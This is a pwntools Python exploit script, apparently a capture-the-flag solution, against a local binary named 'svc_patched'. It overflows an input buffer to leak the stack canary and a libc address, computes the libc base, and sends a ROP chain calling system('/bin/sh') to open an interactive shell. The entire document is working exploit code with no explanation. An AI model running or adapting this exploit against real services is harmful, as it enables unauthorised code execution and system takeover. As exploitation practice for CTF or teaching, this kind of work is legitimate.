#!/usr/bin/python3
from pwn import *

#context.log_level = 'debug'
exe = context.binary = ELF("/tmp/patch/svc_patched", checksec=False)
libc = ELF("/tmp/patch/libc.so.6", checksec=False)

p = process(env={"LD_PRELOAD": "./libstdc++.so.6 ./libgcc_s.so.1"})
#p = remote()

#gdb.attach(p, gdbscript='''
#        b*0x0000000000400B11
#        c
#''')

# Leak canary
padding = b'A'*0xa9
p.sendlineafter(b">>", b"1")
p.sendafter(b">>", padding)
p.sendlineafter(b">>", b"2")
p.recvuntil(padding)
canary = u64(b'\0' + p.recv(7))
log.info("Canary leak: " + hex(canary))

# Leak libc
padding = b'A'*0xa8 + b'B'*8 + b'C'*8
p.sendlineafter(b">>", b"1")
p.sendafter(b">>", padding)
p.sendlineafter(b">>", b"2")
p.recvuntil(padding)
libc_leak = u64(p.recv(6) + b'\0\0')
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x20830
log.info("Libc base: " + hex(libc.address))

ropper = b""
ropper += p64(0x0000000000400ea3)
ropper += p64(next(libc.search(b"/bin/sh\0")))
ropper += p64(0x00000000004008b1)
ropper += p64(libc.sym['system'])

input()
# Payload
payload = b'A'*0xa8 + p64(canary) + b'B'*8
payload += ropper
p.sendlineafter(b">>", b"1")
p.sendafter(b">>", payload)
p.sendlineafter(b">>", b"3")

p.interactive()
